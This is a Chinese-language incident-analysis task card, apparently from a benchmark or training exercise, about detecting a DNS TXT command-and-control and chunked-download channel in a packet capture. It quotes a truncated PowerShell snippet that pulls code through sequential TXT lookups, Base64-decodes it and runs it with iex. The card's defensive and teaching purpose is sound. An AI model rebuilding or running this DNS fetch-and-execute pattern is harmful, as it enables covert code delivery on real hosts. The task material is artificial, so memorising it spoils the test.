# DNS TXT C2 调查任务

## 调查背景

一台内网主机持续访问内部 DNS，并出现大量不同子域名的 TXT 查询。需要判断它是正常 DNS 业务、域名隧道还是命令下载通道。

## 任务 A：DNS 基线

列出查询主机、DNS 服务器、查询类型和后缀，统计普通域名、异常后缀、TXT、NXDomain、频率和时间间隔。区分内网 DNS、外部 DNS 和广播名称服务。

## 任务 B：TXT 内容

1. 提取 TXT 响应内容。
2. 标记脚本、下载、编码和执行语义。
3. 计算长度、类型和哈希。
4. 不执行内容。

本样本中可观察到包含以下语义的 TXT：

```text
@$str='';$i=1;while(1){...nslookup -q=txt "l.$i..."; ... FromBase64String ... iex $str@
```

这是高优先级证据：TXT 内容包含命令执行逻辑，不是普通 DNS 文本。

## 任务 C：分片下载

找出 `l.1`、`l.2` 等顺序查询，统计分片数量、响应长度和缺失序号，判断能否按顺序重建内容，并保存每片的 DNS MessageID/PacketID。

## 任务 D：C2 判定

输出：

- 事实：哪个主机在什么时间请求了哪些域名和 TXT。
- 推断：查询是否符合 DNS 隧道/命令下载通道。
- 未知：服务器归属、主机进程、执行结果、后续持久化和影响。

## 任务 E：检测和处置

以域名后缀、TXT 频率、分片序号和内容语义建立候选检测；检查其他主机是否访问相同后缀；阻断时保留 DNS 日志和 PCAP；同时调查进程、计划任务、脚本块日志和 PowerShell 历史。

## 命令

```sh
/tmp/pcap-inspect -read testdata/enterprise-traffic-analysis/dns-tunnel-c2/capture.pcap -workers 1 -protocol dns -rows 30
```

## 禁止的捷径

- 不执行 TXT 中的 PowerShell。
- 不访问恶意域名或外部 DNS。
- 不把每个 TXT 查询都判定为隧道。
- 不把 DNS 层证据直接解释成命令执行成功。
- 不把完整恶意脚本直接送入未脱敏的模型上下文。
